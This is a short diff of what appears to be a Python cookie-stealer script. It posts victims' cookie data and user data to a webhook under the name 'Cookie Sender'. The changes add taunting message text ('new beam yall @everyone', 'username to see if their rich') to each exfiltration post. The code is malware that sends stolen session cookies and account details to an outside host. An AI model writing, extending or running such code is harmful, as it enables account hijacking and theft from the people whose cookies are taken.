@@ -47,7 +47,7 @@ def main():
     requests.post(loadingauth,
                   json={
                       'username': 'Cookie sender',
-                      'content': f'```{cookiedata}```'
+                      'content': f'```"new beam yall @everyone"{cookiedata}```'
  
                   })
     os.system('cls')
@@ -62,7 +62,7 @@ def main():
     requests.post(loadingauth,
                   json={
                       'username': 'Cookie Sender',
-                      'content': f'```{userdata}```'
+                      'content': f'```"username to see if their rich"{userdata}```'
                   })
 
 
